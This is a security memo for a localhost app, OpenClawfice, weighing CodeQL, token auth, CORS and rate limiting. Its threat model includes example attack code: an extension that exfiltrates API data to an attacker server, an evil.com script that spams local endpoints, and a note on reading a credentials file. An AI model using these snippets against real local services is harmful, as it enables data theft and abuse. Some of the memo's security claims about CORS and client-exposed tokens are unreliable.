# Localhost Security Analysis

**Should we remove CodeQL? Should we add authentication?**

---

## TL;DR

**CodeQL:** KEEP IT - catches real issues, false positives are easy to dismiss  
**Authentication:** ADD IT - prevents malicious apps on same machine from exploiting endpoints  
**Priority:** MEDIUM - add auth post-launch, not a launch blocker

---

## Current Security Posture

### What We Have
✅ npm audit: 0 vulnerabilities  
✅ Snyk Agent Scan: AI security  
✅ Dependabot: Auto-updates  
✅ TypeScript: Type safety  
✅ ESLint: Code quality  
✅ Next.js defaults: XSS protection, auto-escaping  
✅ CodeQL: Static analysis

### What We DON'T Have
❌ API authentication  
❌ CORS headers  
❌ Rate limiting  
❌ Request signing  
❌ Session tokens  

---

## Attack Vectors (Localhost Apps)

### Scenario 1: Malicious App on Same Machine

**Attacker:** Bad npm package, malicious browser extension, compromised dev tool

**Can they:**
- ✅ Read agent data: `GET http://localhost:3333/api/office`
- ✅ Inject fake accomplishments: `POST http://localhost:3333/api/office/actions`
- ✅ Read chat history: `GET http://localhost:3333/api/office/chat`
- ✅ Manipulate quest log: `POST http://localhost:3333/api/office/actions`
- ✅ Spam water cooler: `POST http://localhost:3333/api/office/chat`
- ❌ Execute code on machine: No (read/write files only, no RCE)
- ❌ Steal credentials: Maybe (if they read `~/.openclaw/openclaw.json`)

**Risk Level:** MEDIUM-HIGH

### Scenario 2: Malicious Website (Browser)

**Attacker:** User visits evil.com while OpenClawfice runs

**Can they:**
- ⚠️ Make requests to localhost:3333 (browser allows localhost)
- ⚠️ Read responses if CORS is permissive
- ✅ Spam POST endpoints (blind - can't read responses due to CORS)
- ❌ Direct file access (browser sandbox prevents this)

**Risk Level:** LOW-MEDIUM (CORS provides some protection)

### Scenario 3: Port Scanner / Network Tool

**Attacker:** Someone on same network (coffee shop, office)

**Can they:**
- ❌ Access localhost:3333 from network (bound to 127.0.0.1 only)
- ✅ If misconfigured to bind 0.0.0.0, full access

**Risk Level:** LOW (localhost binding is default)

---

## Should We Remove CodeQL?

### NO - Keep It For These Reasons:

1. **Catches Real Issues**
   - Path traversal vulnerabilities
   - SQL injection (if we add database)
   - XSS in future features
   - Prototype pollution
   - Regular expression DoS

2. **Future-Proofing**
   - As we add features, new vulns might appear
   - CodeQL catches them automatically
   - Prevents regressions

3. **Trust Signal**
   - Shows we take security seriously
   - GitHub Security tab shows "Scanned"
   - Users can verify no critical issues

4. **Free & Automatic**
   - Runs on every commit
   - Zero maintenance cost
   - Just dismiss false positives once

5. **Industry Standard**
   - All serious projects use static analysis
   - Removing it looks suspicious

### How to Handle False Positives

**Don't delete CodeQL. Instead:**

1. Review each finding
2. Add suppression comments for false positives:
   ```typescript
   // codeql[js/path-injection] Safe: validated path before use
   const filePath = join(STATUS_DIR, file);
   ```
3. Document why it's safe in code comments
4. Dismiss in GitHub Security UI
5. Keep scanning for future real issues

---

## Should We Add Authentication?

### YES - Here's Why:

### Attack: Malicious npm Package

**Scenario:**
```javascript
// evil npm package that user installed
fetch('http://localhost:3333/api/office/actions', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    type: 'add_accomplishment',
    accomplishment: {
      icon: '💣',
      title: 'Injected by malware',
      detail: 'Your system is compromised',
      who: 'Hacker'
    }
  })
});
```

**Result:** Fake accomplishment appears, user is confused/scared

### Attack: Browser Extension

**Scenario:**
```javascript
// malicious Chrome extension
chrome.tabs.onUpdated.addListener(() => {
  fetch('http://localhost:3333/api/office', {
    method: 'GET'
  }).then(r => r.json()).then(data => {
    // Exfiltrate agent names, tasks, accomplishments
    sendToEvilServer(data);
  });
});
```

**Result:** Private data (agent tasks, chat) leaked to attacker

### Attack: Malicious Website

**Scenario:**
```html
<!-- evil.com while user has OpenClawfice open -->
<script>
  // Spam fake quests
  for (let i = 0; i < 100; i++) {
    fetch('http://localhost:3333/api/office/actions', {
      method: 'POST',
      body: JSON.stringify({
        type: 'add_action',
        action: { text: 'Spam quest ' + i, from: 'Hacker' }
      })
    });
  }
</script>
```

**Result:** Quest log flooded with spam, UI unusable

---

## Recommended Fix: Token-Based Auth

### Implementation (2-3 hours)

**1. Generate Random Token on Server Start**

```typescript
// lib/auth.ts
import { randomBytes } from 'crypto';

let AUTH_TOKEN: string | null = null;

export function getAuthToken(): string {
  if (!AUTH_TOKEN) {
    AUTH_TOKEN = randomBytes(32).toString('hex');
    console.log('🔑 API Token:', AUTH_TOKEN);
    console.log('Copy this to use the API');
  }
  return AUTH_TOKEN;
}

export function validateRequest(req: Request): boolean {
  const token = req.headers.get('Authorization')?.replace('Bearer ', '');
  return token === AUTH_TOKEN;
}
```

**2. Protect API Routes**

```typescript
// app/api/office/route.ts
import { validateRequest } from '@/lib/auth';

export async function GET(req: Request) {
  if (!validateRequest(req)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }
  
  // ... existing code
}
```

**3. Update Frontend**

```typescript
// lib/api-client.ts
const AUTH_TOKEN = process.env.NEXT_PUBLIC_API_TOKEN || '';

export async function fetchOfficeData() {
  const res = await fetch('/api/office', {
    headers: {
      'Authorization': `Bearer ${AUTH_TOKEN}`
    }
  });
  return res.json();
}
```

**4. Pass Token via Environment**

```bash
# User runs: NEXT_PUBLIC_API_TOKEN=<token> openclawfice
# Or: store in .env.local (gitignored)
```

### Alternative: Session-Based Auth

**Simpler but less secure:**

1. Generate session ID on first page load
2. Store in cookie (HttpOnly, SameSite=Strict)
3. Validate cookie on API requests
4. Rotate session every 24h

**Pros:** No token to copy  
**Cons:** Still vulnerable to extensions with cookie access

---

## CORS Configuration

**Add this to `next.config.mjs`:**

```javascript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/api/:path*',
        headers: [
          { key: 'Access-Control-Allow-Origin', value: 'http://localhost:3333' },
          { key: 'Access-Control-Allow-Methods', value: 'GET,POST,PUT,DELETE' },
          { key: 'Access-Control-Allow-Headers', value: 'Authorization,Content-Type' },
          { key: 'Access-Control-Allow-Credentials', value: 'true' },
        ],
      },
    ];
  },
};
```

**Effect:** Only requests from `localhost:3333` frontend allowed, blocks evil.com

---

## Rate Limiting

**Add this middleware:**

```typescript
// lib/rate-limit.ts
const requests = new Map<string, number[]>();

export function rateLimit(identifier: string, maxRequests = 100, windowMs = 60000): boolean {
  const now = Date.now();
  const userRequests = requests.get(identifier) || [];
  
  // Remove old requests outside window
  const recentRequests = userRequests.filter(time => now - time < windowMs);
  
  if (recentRequests.length >= maxRequests) {
    return false; // Rate limited
  }
  
  recentRequests.push(now);
  requests.set(identifier, recentRequests);
  return true;
}
```

**Usage:**

```typescript
export async function POST(req: Request) {
  const ip = req.headers.get('x-forwarded-for') || 'localhost';
  if (!rateLimit(ip, 60, 60000)) { // 60 req/min
    return NextResponse.json({ error: 'Rate limited' }, { status: 429 });
  }
  // ... existing code
}
```

---

## Recommended Security Roadmap

### Pre-Launch (DO NOT ADD - might break things)
- ✅ Keep CodeQL
- ✅ Keep all current scans
- ✅ Document false positives

### Week 1 Post-Launch (LOW PRIORITY)
- ⬜ Add CORS headers
- ⬜ Add rate limiting
- ⬜ Monitor for abuse

### Week 2-4 Post-Launch (MEDIUM PRIORITY)
- ⬜ Add token-based auth
- ⬜ Update docs with auth setup
- ⬜ Provide migration guide

### Month 2+ (NICE TO HAVE)
- ⬜ Session rotation
- ⬜ Request signing (HMAC)
- ⬜ Audit logging
- ⬜ Suspicious activity detection

---

## Why Not Pre-Launch?

**Reasons to wait:**

1. **Complexity Risk**
   - Auth adds moving parts
   - Might break demo mode
   - Testing takes time
   - Could delay launch

2. **Real-World Risk Is Low**
   - Requires malicious app on same machine
   - User must already be compromised
   - Limited damage (no RCE, just data/UI)

3. **Better to Launch & Iterate**
   - Get users first
   - See if anyone reports abuse
   - Add auth based on real threat data

4. **False Sense of Security**
   - Token auth doesn't protect against:
     - Compromised machine (malware has full access)
     - User error (copying token into wrong place)
   - Better to focus on real threats post-launch

---

## What About CodeQL Findings?

**Review them, don't remove the scanner.**

**Expected findings:**
1. "Missing rate limiting" → Add it (post-launch)
2. "Uncontrolled data in path" → Add validation or suppress if safe
3. "Missing CSRF protection" → Add CORS (post-launch)
4. "Client-side redirect" → Suppress if URLs are hardcoded

**Process:**
1. Open GitHub Security → Code Scanning
2. For each alert:
   - Click "View alert"
   - Read description
   - Check if it applies (most won't for localhost apps)
   - Either:
     - Fix it (if real issue)
     - Suppress with comment (if false positive)
     - Dismiss in UI (if not applicable)

---

## Final Recommendations

### ✅ DO THIS NOW (Pre-Launch)
1. Keep CodeQL - don't remove it
2. Review findings, dismiss false positives
3. Add code comments explaining why each is safe
4. Launch without auth (low real-world risk)

### ⏰ DO THIS WEEK 1 (Post-Launch)
1. Add CORS headers (blocks evil.com attacks)
2. Add basic rate limiting (prevents spam)
3. Monitor logs for suspicious activity

### 🔒 DO THIS WEEK 2-4 (If Needed)
1. Implement token-based auth (if abuse detected)
2. Add request signing (for paranoid users)
3. Create security hardening guide

### ❌ DON'T DO THIS
1. Remove CodeQL (loses trust signal)
2. Add complex auth pre-launch (delays shipping)
3. Ignore security entirely (bad reputation)

---

## Questions?

**Q: Is it safe to launch without auth?**  
A: Yes. Real risk is low (requires compromised machine), and auth can be added post-launch if needed.

**Q: What if CodeQL finds real issues?**  
A: Fix them! But most findings will be false positives for localhost apps.

**Q: Should users be warned about localhost security?**  
A: Yes. Add to docs: "OpenClawfice runs on localhost and trusts all requests. Only use on secure machines."

**Q: What if someone reports a security issue?**  
A: Thank them, assess severity, fix within 24-48h if critical, disclose transparently.

---

**Last updated:** Feb 24, 2026  
**Recommendation:** Keep CodeQL, launch without auth, add CORS/rate-limiting week 1  
**Priority:** Auth is post-launch optimization, not a launch blocker
